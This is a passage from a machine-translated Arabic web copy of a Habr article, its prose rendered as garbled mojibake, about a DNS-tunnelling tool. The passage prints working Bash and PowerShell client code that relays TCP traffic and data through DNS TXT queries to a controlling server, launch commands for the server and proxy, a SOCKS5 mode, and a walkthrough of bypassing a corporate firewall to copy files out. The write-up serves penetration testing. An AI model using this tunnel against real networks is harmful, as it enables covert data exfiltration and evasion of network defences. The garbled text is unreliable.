ุงูุฃูุฑ ูุฐูู ุ ูุชู ุชูููุฐ ูุธููุฉ ุงูุฑุฏ (ูุฑุงุกุฉ ุงูุจูุงูุงุช ุงููุณุชููุฉ ูู ุงููุฏู ุ ูุชูุณูููุง ูุฅุฑุณุงููุง ุฅูู ุงูุฎุงุฏู). </p><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ุ ูุชู ุงูุชุญูู ููุง ุฅุฐุง ูุงูุช ููุงู ุจูุงูุงุช ุฌุฏูุฏุฉ ูู ุงูุฎุงุฏู.  ุฅุฐุง ุชู ุงูุนุซูุฑ ุนูููุง ุ ูุฅููุง ูุชุญูู ููุง ุฅุฐุง ูุงู ูุฌุจ ุฅูุบุงุก ุงูุงุชุตุงู.  ุชุญุฏุซ ุงููุฌูุฉ ููุณูุง ุนูุฏูุง ูุชููู ูุนูููุงุช ุญูู ุงููุฏู ุจุงุณุชุฎุฏุงู ip 0.0.0.0 ูุงููููุฐ 00. ูู ูุฐู ุงูุญุงูุฉ ุ ูููู ุจูุณุญ ูุงุตู ุงูููู (ุฅุฐุง ูู ููู ููุชูุญูุง ุ ููู ุชููู ููุงู ูุดููุงุช) ูุชุบููุฑ ip ip ุงููุณุชูุฏู ุฅูู 0.0.0.0 ุงููุงุฑุฏ. </p><br><p style=";text-align:right;direction:rtl">  ุนูุงูุฉ ุนูู ุฐูู ุ ูุฑู ูุง ุฅุฐุง ูุงูุช ููุงู ุญุงุฌุฉ ูุฅูุดุงุก ุงุชุตุงู ุฌุฏูุฏ.  ุจูุฌุฑุฏ ุฃู ุชุจุฏุฃ ุงูุฑุณุงุฆู ุงูุชุงููุฉ ูู ุฅุฑุณุงู ุจูุงูุงุช ููุง ูููุฏู ุ ูู ุญุงูุฉ ุนุฏู ุชุทุงุจู ุนููุงู IP ุงูุณุงุจู ูุน ุงูุญุงูู (ุณูููู ุฐูู ุจุนุฏ ุฅุนุงุฏุฉ ุงูุชุนููู) ุ ูุชุบููุฑ ุงููุฏู ุฅูู ุฌุฏูุฏ ุ ูุฅูุดุงุก ุงุชุตุงู ูู ุฎูุงู ุงูุฃูุฑ <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> ุ ุญูุซ ูููู <code>$ip</code> ูู ุงููุฏู ุ <code>$port</code> ูู ุงููููุฐ ุงููุฏู. <br>  ูุชูุฌุฉ ูุฐูู ุ ุฅุฐุง ูุงู ุงูุงุชุตุงู ูุฏ ุชู ุฅูุดุงุคู ุจุงููุนู ุ ูุณูุชู ูู <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> ุฌุฒุก ุงูุจูุงูุงุช ุงููุงุฑุฏุฉ <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> ุฅูู ุงููุงุตู ุนุจุฑ ุงูุฃูุฑ <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code>  <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> ุ ุญูุซ <code>${data_array[2]}</code> ูู ูุง ุญุตููุง ุนููู ูู ุงูุฎุงุฏู. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">while : do if [[ $is_set = 'SET' ]] then reply fi data=$(get_data $id) if [[ ${data:0:2} = $id ]] then if [[ ${data:2:2} = 'ND' ]] then sleep 0.1 else IFS=':' read -r -a data_array &lt;&lt;&lt; $data data=${data_array[0]} is_id=${data:0:2} ip=${data:2} port=${data_array[1]} if [[ $is_id = $id ]] then if [[ $ip = '0.0.0.0' &amp;&amp; $port = '00' ]] then exec 3&lt;&amp;- exec 3&gt;&amp;- is_set='NOTSET' echo "Connection OFF" last_ip=$ip fi if [[ $last_ip != $ip ]] then exec 3&lt;&gt;/dev/tcp/$ip/$port is_set='SET' echo "Connection ON" last_ip=$ip fi if [[ $is_set = 'SET' ]] then echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3 fi fi fi fi done</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงูุขู ุงููุธุฑ ูู ุฅุฑุณุงู ูุธููุฉ ุงูุฑุฏ.  ุฃููุงู ุ ููุฑุฃ 2048 ุจุงูุช ูู ุงููุงุตู ููุดููุฑูุง ููุฑูุง ุนุจุฑ <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ).  ุซู ุ ุฅุฐุง ูุงูุช ุงูุฅุฌุงุจุฉ ูุงุฑุบุฉ ุ ูุฅููุง ูุฎุฑุฌ ูู ุงููุธููุฉ ุ ูุฅูุง ูุฅููุง ูุจุฏุฃ ุนูููุฉ ุงูุชูุณูู ูุงูุฅุฑุณุงู.  ูุงุญุธ ุฃูู ุจุนุฏ ุชุดููู ุทูุจ ุงูุฅุฑุณุงู ุนุจุฑ ุงูุญูุฑ ุ ูุชู ุงูุชุญูู ูู ุงูุชุณููู ูููุฌุงุญ.  ุฅุฐุง ูุฌุญุช ุ ูุงุฎุฑุฌ ูู ุงูุฏูุฑุฉ ุ ูุฅูุง ุญุงูู ุญุชู ุชุนูู. </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">reply() { response=$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0) if [[ $response != '' ]] then debug_echo 'Got response from target server ' response_len=${#response} number_of_blocks=$(( ${response_len} / ${MESSAGE_LEN})) if [[ $(($response_len % $MESSAGE_LEN)) = 0 ]] then number_of_blocks-=1 fi debug_echo 'Sending message back...' point=0 for ((i=$number_of_blocks;i&gt;=0;i--)) do blocks_data=${response:$point:$MESSAGE_LEN} if [[ ${#blocks_data} -gt 63 ]] then localpoint=0 while : do block=${blocks_data:localpoint:63} if [[ $block != '' ]] then dat+=$block. localpoint=$((localpoint + 63)) else break fi done blocks_data=$dat dat='' point=$((point + MESSAGE_LEN)) else blocks_data+=. fi while : do block=$(printf %03d $i) check_deliver=$(dig ${HOST} 2$(generate_random 4)$id$block.$blocks_data${DNS_DOMAIN} TXT | grep -oP '\"\K[^\"]+') if [[ $check_deliver = 'ENDBLOCK' ]] then debug_echo 'Message delivered!' break fi IFS=':' read -r -a check_deliver_array &lt;&lt;&lt; $check_deliver deliver_data=${check_deliver_array[0]} block_check=${deliver_data:2} if [[ ${check_deliver_array[1]} = 'OK' ]] &amp;&amp; [[ $((10#${deliver_data:2})) = $i ]] &amp;&amp; [[ ${deliver_data:0:2} = $id ]] then break fi done done else debug_echo 'Empty message from target server, forward the next package ' fi }</code> </pre> </div></div><br><h2 id="powershell-klient" style=";text-align:right;direction:rtl">  ุจูููุฑุดูู ุงูุนููู: </h2><br><p style=";text-align:right;direction:rtl">  ูุธุฑูุง ูุฃููุง ููุง ุจุญุงุฌุฉ ุฅูู ุชูุณูุฑ ูุงูู ูุงูุนูู ุนูู ูุนุธู ุงูุฃูุธูุฉ ุงูุญุงููุฉ ุ ูุฅู ุงูุนููู ุงูุฃุณุงุณู ููุธุงู ุงูุชุดุบูู Windows ูู ุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ nslookup ุงูููุงุณูุฉ ููุงุชุตุงู ุนุจุฑ DNS ูุงููุงุฆู System.Net.Sockets.TcpClient ูุชุฃุณูุณ ุงุชุตุงู ุนูู ุงูุดุจูุฉ ุงูุฏุงุฎููุฉ. </p><br><p style=";text-align:right;direction:rtl">  ูู ุดูุก ุจุณูุท ุฌุฏุง  ูู ุชูุฑุงุฑ ููุญููุฉ ูู ุงุณุชุฏุนุงุก ูุฃูุฑ nslookup ุจุงุณุชุฎุฏุงู ุงูุจุฑูุชูููู ุงูููุถุญ ุณุงุจููุง. </p><br><p style=";text-align:right;direction:rtl">  ุนูู ุณุจูู ุงููุซุงู ุ ููุชุณุฌูู ุ ูู ุจุชูููุฐ ุงูุฃูุฑ: <br> <code>$text = &amp;nslookup -q=TXT $act$seed$clientname$Dot$domain $server 2&gt;$null</code> <br>  ูู ุญุงูุฉ ุญุฏูุซ ุฃุฎุทุงุก ุ ูุฅููุง ูุง ูุนุฑุถูุง ุ ูุฅุฑุณุงู ููู ูุงุตู ุงูุฎุทุฃ ุฅูู $ null. </p><br><p style=";text-align:right;direction:rtl">  ุฅุฑุฌุงุน NSLOOKUP ุฅุฌุงุจุฉ ููุงุซูุฉ: <br><img src="https://habrastorage.org/webt/xz/n9/wk/xzn9wkh45ds0pxmpykpo5xrhldc.png"></p><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ูุญุชุงุฌ ุฅูู ูุฏ ุฌููุน ุงูุฃุณุทุฑ ุจุนูุงูุงุช ุงูุชุจุงุณ ุ ูุงูุชู ููุฑ ุจูุง ุฎูุงู ููุณู ููุชุธู: </p><br><p style=";text-align:right;direction:rtl"> <code>$text = [regex]::Matches($text, '"(.*)"') | %{$_.groups[1].value} | %{$_ -replace '([ "\t]+)',$('') }</code> </p> <br><p style=";text-align:right;direction:rtl">  ุงูุขู ููููู ูุนุงูุฌุฉ ุงูุฃูุงูุฑ ุงููุณุชููุฉ. <br>  ูู ูู ูุฑุฉ ูุชุบูุฑ ุนููุงู IP ูู "ุงูุถุญูุฉ" ุ ูุชู ุฅูุดุงุก ุนููู TCP ุ ููุชู ุฅูุดุงุก ุงุชุตุงู ููุจุฏุฃ ููู ุงูุจูุงูุงุช.  ูู ุฎุงุฏู DNS ุ ูุชู ูู ุชุฑููุฒ base64 ุ ููุชู ุฅุฑุณุงู ูุญุฏุงุช ุงูุจุงูุช ุฅูู ุงูุถุญูุฉ.  ุฅุฐุง ุฃุฌุงุจ "ุงูุถุญูุฉ" ุนูู ุดูุก ูุง ุ ูุณูููู ุจุชุฑููุฒู ูุชููุณูู ุฅูู ุฃุฌุฒุงุก ูุชูููุฐ ุทูุจุงุช nslookup ููููุง ููุจุฑูุชูููู.  ูุฐุง ูู ุดูุก. <br>  ุนูุฏูุง ุชุถุบุท ุนูู Ctrl + C ุ ูุชู ุชูููุฐ ุทูุจ ุญุฐู ุงูุนููู. </p><br><h2 id="proxy" style=";text-align:right;direction:rtl">  ุงููููู: </h2><br><p style=";text-align:right;direction:rtl">  ุงููููู ููุฎุงุฏู ูู ุฎุงุฏู ูููู ุตุบูุฑ ูู ุจูุซูู 3. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/k4/lp/0u/k4lp0uzffo9oo90eqommsetwvn4.png"></p><br><p style=";text-align:right;direction:rtl">  ูู ุงููุนููุงุช ุงูุชู ุชุญุชุงุฌ ุฅูููุง ูุชุญุฏูุฏ IP ุงูุฎุงุต ุจุฎุงุฏู DNS ุ ูุงููููุฐ ุงูุฐู ุชุชุตู ุจู ุจุงูุฎุงุฏู ุ ูุฅู ุงูุฎูุงุฑ - ุงูุนููุงุก ูุนูุฏูู ูุงุฆูุฉ ุจุงูุนููุงุก ุงููุณุฌููู ุ <code>--target - target ip</code> ุ <code>--target_port - target port</code> ุ - ุงูุนููู - ูุนุฑู ุงูุนููู ุงูุฐู <code>--client</code> ูุนู ุงูุนูู (ููุธุฑ ุจุนุฏ ุชูููุฐ - <code>--clients</code> ) ุ - <code>--send_timeout</code> - ูููุฉ ูุฅุฑุณุงู ุงูุฑุณุงุฆู ูู ุงูุชุทุจูู. </p><br><p style=";text-align:right;direction:rtl">  ุนูุฏ ุจุฏุก ุงูุชุดุบูู ุจุงุณุชุฎุฏุงู ูุนููุฉ - <code>--clients</code> ุ ูุฑุณู ุงููููู ุทูุจูุง ุฅูู ุงูุฎุงุฏู ุจุงูุชูุณูู <code>\x00GETCLIENTS\n</code> . <br>  ูู ุญุงูุฉ ุจุฏุก ุงูุนูู ุ ุนูุฏ ุงูุงุชุตุงู ุ ูุฑุณู ุฑุณุงูุฉ ุจุงูุชูุณูู <code>\x02RESET:client_id\n</code> ูุฅุนุงุฏุฉ ุชุนููู ุงูุงุชุตุงู ุงูุณุงุจู.  ุจุนุฏ ุฃู ูุฑุณู ูุนูููุงุช ุญูู ูุฏููุง: <code>\x01client_id:ip:port:\n</code> <br>  ุนูุงูุฉ ุนูู ุฐูู ุ ุนูุฏ ุฅุฑุณุงู ุฑุณุงุฆู ุฅูู ุงูุนููู ุ ูุฑุณู ุงูุจุงูุชุงุช ุจุชูุณูู <code>\x03data</code> ุ <code>\x03data</code> ุจุจุณุงุทุฉ ุจุงูุชุงุช ุฎุงู ุฅูู ุงูุชุทุจูู. <br>  ุฃูุถุง ุ ุงููููู ูุฏุนู ูุถุน SOCKS5. </p><br><h2 id="kakie-trudnosti-mogut-vozniknut" style=";text-align:right;direction:rtl">  ูุง ุงูุตุนูุจุงุช ุงูุชู ูุฏ ุชูุดุฃุ </h2><br><p style=";text-align:right;direction:rtl">  ููุง ูู ุงูุญุงู ูุน ุฃู ุขููุฉ ุ ูุฏ ุชูุดู ุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ.  ุฏุนููุง ูุง ููุณู ุฃู ููู DNS ูู ุดูุก ุฑููู ุ ููููู ููุนุฏูุฏ ูู ุงูุนูุงูู ุงูุชุฃุซูุฑ ุนูู ุชุดุบููู ุ ูู ุจููุฉ ุงูุดุจูุฉ ุฅูู ุฌูุฏุฉ ุงูุงุชุตุงู ุจุฎุงุฏู ุงูุฅูุชุงุฌ ุงูุฎุงุต ุจู. </p><br><p style=";text-align:right;direction:rtl">  ุฃุซูุงุก ุงูุงุฎุชุจุงุฑ ุ ูุงุญุธูุง ูู ุจุนุถ ุงูุฃุญูุงู ููุงุทู ุงูุฎูู ุงูุตุบูุฑุฉ.  ุนูู ุณุจูู ุงููุซุงู ุ ุนูุฏ ุณุฑุนุงุช ุทุจุงุนุฉ ุนุงููุฉ ุ ูู ุฎูุงู ุงูุนูู ุนูู ssh ุ ูุฌุฏุฑ ุชุนููู ุงููุนููุฉ <code>--send_timeout</code> ุ ุญูุซ ูุจุฏุฃ ุงูุนููู ูู ุงูุชุฌููุฏ ุจุฎูุงู ุฐูู.  ุฃูุถูุง ุ ูู ุจุนุถ ุงูุฃุญูุงู ูุฏ ูุง ูุชู ุฅูุดุงุก ุงูุงุชุตุงู ูู ุงููุฑุฉ ุงูุฃููู ุ ูููู ูููู ูุนุงูุฌุชู ุจุณูููุฉ ุนู ุทุฑูู ุฅุนุงุฏุฉ ุชุดุบูู ุงูุฎุงุฏู ุงููููู ุ ุญูุซ ุณูุชู ุฅุนุงุฏุฉ ุชุนููู ุงูุงุชุตุงู ุฃุซูุงุก ุงูุงุชุตุงู ุงูุฌุฏูุฏ.  ูุงูุช ููุงู ุฃูุถูุง ูุดุงูู ูู ุชุญููู ุงููุฌุงู ุนูุฏ ุงูุนูู ูุน ุณูุงุณู ุงูุจุฑููุณู ุ ูููู ูุฐุง ูุงุจู ููุชุซุจูุช ุฃูุถูุง ุฅุฐุง ุญุฏุฏุช ูุนููุฉ ุฅุถุงููุฉ ููููุงุก ุงูุจุฑููุณู.  ุชุฌุฏุฑ ุงูุฅุดุงุฑุฉ ุฅูู ุฃูู ูู ุงูููุช ุงูุญุงูู ูุง ุชุชุญูู ุงูุฃุฏุงุฉ ูู ูุธูุฑ ุงูุทูุจุงุช ุบูุฑ ุงูุถุฑูุฑูุฉ ูู ุฎูุงุฏู DNS ููุชุฎุฒูู ุงููุคูุช ุ ูุฐูู ูุฏ ููุดู ุงูุงุชุตุงู ูู ุจุนุถ ุงูุฃุญูุงู ุ ููุน ุฐูู ุ ุชุชู ูุนุงูุฌุฉ ูุฐุง ุงูุฃูุฑ ูุฑุฉ ุฃุฎุฑู ุจุงุณุชุฎุฏุงู ุงูุทุฑููุฉ ุงูููุถุญุฉ ุฃุนูุงู. </p><br><h2 id="zapusk" style=";text-align:right;direction:rtl">  ุฅุทูุงู </h2><br><p style=";text-align:right;direction:rtl">  ุชูููู ุณุฌูุงุช NS ุนูู ุงููุฌุงู: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/_q/p4/er/_qp4erwn54g5nqqxmlnnquv1itk.png"></p><br><p style=";text-align:right;direction:rtl">  ููุชุธุฑ ุญุชู ูุชู ุชุญุฏูุซ ุฐุงูุฑุฉ ุงูุชุฎุฒูู ุงููุคูุช (ุนุงุฏุฉ ูุง ุชุตู ุฅูู 5 ุณุงุนุงุช). </p><br><p style=";text-align:right;direction:rtl">  ูุจุฏุฃ ุงูุฎุงุฏู: <br> <code>python3 ./server.py --domain oversec.ru</code> </p> <br><p style=";text-align:right;direction:rtl">  ุฅุทูุงู ุงูุนููู (Bash): <br> <code>bash ./bash_client.sh -d oversec.ru -n TEST1</code> </p> <br><p style=";text-align:right;direction:rtl">  ูุจุฏุฃ ุงูุนููู (ููู): <br> <code>PS:&gt; ./ps_client.ps1 -domain oversec.ru -clientname TEST2</code> </p> <br><p style=";text-align:right;direction:rtl">  ููุฑู ูุงุฆูุฉ ุงูุนููุงุก ุงููุชุตููู: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --clients</code> </p> <br><p style=";text-align:right;direction:rtl">  ูู ุจุชุดุบูู ุงููููู: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --socks5 --localport 9090 --client 1</code> </p> <br><p style=";text-align:right;direction:rtl">  ุงุฎุชุจุงุฑ: </p><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุจุฏุก ุชุดุบูู ุงูุฎุงุฏู ูุนููู ูุงุญุฏ ุนูู ุงูุฃูู ุ ูููููุง ุงููุตูู ุฅูู ุงูุฎุงุฏู ุงููููู ููุง ูู ูุงู ุงูุฌูุงุฒ ุงูุจุนูุฏ. <br>  ุฏุนูุง ูุญุงูู ูุญุงูุงุฉ ุงููููู ุงูุชุงูู: ูุฑูุฏ pentester ุชูุฒูู ููู ูู ุฎุงุฏู ูู ุงูุดุจูุฉ ุงููุญููุฉ ููุคุณุณุฉ ูุญููุฉ ุจูุงุณุทุฉ ุฌุฏุงุฑ ุญูุงูุฉ ุ ุฃุซูุงุก ุงุณุชุฎุฏุงู ุฃุณุงููุจ ุงูููุฏุณุฉ ุงูุงุฌุชูุงุนูุฉ ุ ูุงู ูุงุฏุฑูุง ุนูู ุฅุฌุจุงุฑ ุนููู DNS ุนูู ุงูุชุดุบูู ุฏุงุฎู ุงูุดุจูุฉ ููุนุฑูุฉ ูููุฉ ูุฑูุฑ ุฎุงุฏู SSH. </p><br><p style=";text-align:right;direction:rtl">  ูููู Pentester ุนูู ุงูุฌูุงุฒ ุงูุฎุงุต ุจู ุจุจุฏุก ุชุดุบูู ูููู ุ ููุง ูุดูุฑ ุฅูู ุงูุนููู ุงูุถุฑูุฑู ุ ูููููู ุจุนุฏ ุฐูู ุฅุฌุฑุงุก ููุงููุงุช ููุงุซูุฉ ุณูุชู ุฅุฑุณุงููุง ุฅูู ุงูุนููู ุ ููู ุงูุนููู ุฅูู ุงูุดุจูุฉ ุงููุญููุฉ. <br> <code>scp -P9090 -C root@localhost:/root/dnserver.py test.kek</code> </p> <br><p style=";text-align:right;direction:rtl">  ุฏุนููุง ูุฑู ูุง ุญุฏุซ: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/xd/un/ag/xdunagwddytfwinhgkcxxossnqi.png"></p><br><p style=";text-align:right;direction:rtl">  ูู ุงูุฌุฒุก ุงูุนููู ุงูุฃูุณุฑ ุ ููููู ุฑุคูุฉ ุงุณุชุนูุงูุงุช DNS ุงูุชู ุชุฃุชู ุฅูู ุงูุฎุงุฏู ุ ูุญุฑูุฉ ุงููููู ูู ุงูุฌุฒุก ุงูุนููู ุงูุฃููู ุ ูุญุฑูุฉ ูุฑูุฑ ุงูุนููู ูู ุงูุฌุฒุก ุงูุณููู ุงูุฃูุณุฑ ุ ูุชุทุจูููุง ูู ุฃุณูู ุงููููู.  ููุฏ ุชุญููุช ุงูุณุฑุนุฉ ุฅูู ุญุฏ ูุจูุฑ ุนูู ููู DNS: 4.9 ูููู ุจุงูุช / ุซุงููุฉ ุจุงุณุชุฎุฏุงู ุงูุถุบุท. </p><br><p style=";text-align:right;direction:rtl">  ุนูุฏ ุงูุชุดุบูู ุจุฏูู ุถุบุท ุ ุฃุธูุฑุช ุงูุฃุฏุงุฉ ุณุฑุนุฉ 1.8 ูููู ุจุงูุช / ุซุงููุฉ: </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/vs/lv/6o/vslv6oycbyicpppojlsbh2hs_hi.png"></p><br><p style=";text-align:right;direction:rtl">  ุฏุนููุง ููุธุฑ ุจุนูุงูุฉ ูู ุญุฑูุฉ ูุฑูุฑ ุฎุงุฏู DNS ุ ูุฐูู ูุณุชุฎุฏู ุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ tcpdump. <br> <code>tcpdump -i eth0 udp port 53</code> </p> <br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/oo/wx/pf/oowxpflehofc-dmyizrf6pwre08.png"></p><br><p style=";text-align:right;direction:rtl">  ูุฑู ุฃู ูู ุดูุก ูุชูุงูู ูุน ุงูุจุฑูุชูููู ุงูููุตูู: ูููู ุงูุนููู ุฏุงุฆููุง ุจุงุณุชูุตุงุก ุงูุฎุงุฏู ุนูุง ุฅุฐุง ูุงู ูุฏูู ุฃู ุจูุงูุงุช ุฌุฏูุฏุฉ ููุฐุง ุงูุนููู ุจุงุณุชุฎุฏุงู ุทูุจุงุช ุงููููุฐุฌ <code>1c6Zx9Vi39.oversec.ru</code> .  ุฅุฐุง ูุงูุช ููุงู ุจูุงูุงุช ุ ูุณูุณุชุฌูุจ ุงูุฎุงุฏู ุจูุฌููุนุฉ ูู ุณุฌูุงุช TXT ุ ูุฅูุง ูุฅููช client_numูช ND ( <code>39ND</code> ).  ูุฑุณู ุงูุนููู ูุนูููุงุช ุฅูู ุงููููู ุจุงุณุชุฎุฏุงู ุฃููุงุน ูู ุงูุงุณุชุนูุงูุงุช <code>28sTx39003.MyNTYtZ2NtQG9wZW5zc2guY29tAAAAbGNoYWNoYTIwLXBvbHkxMzA1QG9wZW5zc.2guY29tLGFlczEyOC1jdHIsYWVzMTkyLWN0cixhZXMyNTYtY3RyLGFlczEyOC1n.Y21Ab3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAANV1bWFjLTY.0LWV0bUBvcGVuc3NoLmNvbSx1bWFjLTEyOC1.oversec.ru.</code> </p><br><p style=";text-align:right;direction:rtl">  ูู ููุงุทุน ุงูููุฏูู ุงูุชุงููุฉ ุ ููููู ุฃู ุชุฑู ุจูุถูุญ ููู ุชุนูู ุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ ุฌูุจูุง ุฅูู ุฌูุจ ูุน ุนุฏุงุฏ ุงููุชุฑ ููุถุน SOCKS5. </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/N6Nm9mWFI6w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/xSM-Dl1uo1k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="itog" style=";text-align:right;direction:rtl">  ุงููุชูุฌุฉ: </h2><br><p style=";text-align:right;direction:rtl">  ุฏุนูุง ููุฎุต ููููุง.  ูุง ุงูููุฒุงุช ุงูุชู ูุชูุชุน ุจูุง ูุฐุง ุงูุชุทููุฑ ูููุงุฐุง ููุตู ุจุงุณุชุฎุฏุงููุ </p><br><ol style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุนููุงุก ูุชุฑุฌููู ุนูู Bash ู Powershell: ูุง ูููู ุชุดุบูู EXE-shnikov ู ELF-s. </li><li style=";text-align:right;direction:rtl">  ุงุณุชูุฑุงุฑ ุงูุงุชุตุงู: ูู ุงูุงุฎุชุจุงุฑุงุช ุ ุชุตุฑูุช ูุงุฆุฏุชูุง ุฃูุซุฑ ุงุณุชูุฑุงุฑูุง ุจูุซูุฑ ุ ูุฅุฐุง ูุงู ููุงู ุฃู ุฃุฎุทุงุก ุ ูููููู ุฅุนุงุฏุฉ ุงูุงุชุตุงู ููุท ุ ุจูููุง ูู ูุชุนุทู ุงูุนููู ุ ููุง ูุงู ุงูุญุงู ูุน dnscat2 ุ ุนูู ุณุจูู ุงููุซุงู. </li><li style=";text-align:right;direction:rtl">  ุณุฑุนุฉ ุนุงููุฉ ุฌุฏูุง ูููู DNS: ุจุงูุทุจุน ุ ูุง ุชุตู ุงูุณุฑุนุฉ ุฅูู ุงูููุฏ ุ ููู ููุงู ุญููุง ุจุฑูุฌููุง ููุฎูุถ ุงููุณุชูู. </li><li style=";text-align:right;direction:rtl">  ููุณุช ููุงู ุญุงุฌุฉ ุฅูู ุญููู ุงููุณุคูู: ูุนูู ุนููู Bash ุจุฏูู ุญููู ุงููุณุคูู ุ ูุฃุญูุงููุง ุชููู ุงูุจุฑุงูุฌ ุงููุตูุฉ ูู Powershell ูุญุธูุฑุฉ ุจููุฌุจ ุณูุงุณุงุช ุงูุฃูุงู ุ ูููู ูุฐุง ุฃูุฑ ุจุณูุท ููุบุงูุฉ. </li><li style=";text-align:right;direction:rtl">  ููุงู ูุถุน ุงููููู socks5 ุ ูุงูุฐู ูุชูุญ ูู ุงูููุงู ุจุฐูู <code>curl -v --socks5 127.0.0.1:9011 https://ident.me</code> ุฃู ุชุดุบูู nmap ุนูู ุงูุดุจูุฉ ุงูุฏุงุฎููุฉ ุจุฃููููุง. </li></ol><br><p style=";text-align:right;direction:rtl">  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุฑูุฒ ุงููููุนุฉ ูุชุงุญ ููุง.</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar432078/">https://habr.com/ru/post/ar432078/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar432068/index.html">ููููุฉ ุชุณููู ุฏุฑุงุณุฉ ุงููุบุฉ ุงูุฅูุฌููุฒูุฉ: 5 ุฎุฏูุงุช ูููุฏุฉ</a></li>
<li><a href="../ar432070/index.html">ุจุงุฎุชุตุงุฑ ุญูู ูููุงุช ุงูุฅุนุงุฏุฉ ุงูููุญููุฉ</a></li>
<li><a href="../ar432072/index.html">ุซูุงุซุฉ ุฃููุงุน ูู ุชุณุฑุจ ุงูุฐุงูุฑุฉ</a></li>
<li><a href="../ar432074/index.html">ููู ูููู ููุงุนุจูู ุชูุฒูู ุงูููุงุด ุงููุงูุน Spelunky ุจุงูุจูุงุฏู</a></li>
<li><a href="../ar432076/index.html">ูุธููุฉ ุบูุฑ ูุนุชุฑู ุจูุง ุชุจุทุฆ ุงูุจุฑูุงูุฌ 5 ูุฑุงุช</a></li>
<li><a href="../ar432080/index.html">ููุงููู ุฎุงุทุฆุฉ ููุงุนุจูู ุนูุฏ ุชูููู ุงููุฎุงุทุฑ. ุงูุณูุทุฑุฉ ุนูู ูููุฏ ุฑูู ุนุดูุงุฆู ูู ุงูุชูููุฉ</a></li>
<li><a href="../ar432082/index.html">ูุงููุฑูุณููุช ุชุดุงุชุจูุช ุชุทูู ูุฌููุนุฉ ููุงุจุณ ุงูุตูู</a></li>
<li><a href="../ar432084/index.html">ููู ุฑุชุจูุง ููุงูุณุฉ ุชุญูู ุจูู ุนูุงู ุงูุฅูุชุงุฌ (ููุง ูู ุงูุงุชุญุงุฏ ุงูุณูููุชู)</a></li>
<li><a href="../ar432086/index.html">ุงูุทุจุงุนุฉ ุซูุงุซูุฉ ุงูุฃุจุนุงุฏ ูู ุงููุฏุฑุณุฉ ุงูุฏูููุฉ ุงูุชู ุณููุช ุจุงุณู M.V. Lomonosov</a></li>
<li><a href="../ar432088/index.html">ุงูุฎููุฉ ุชูุงูุฑ ุนุงููุฉ ุนูู ุฌูุซุจ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
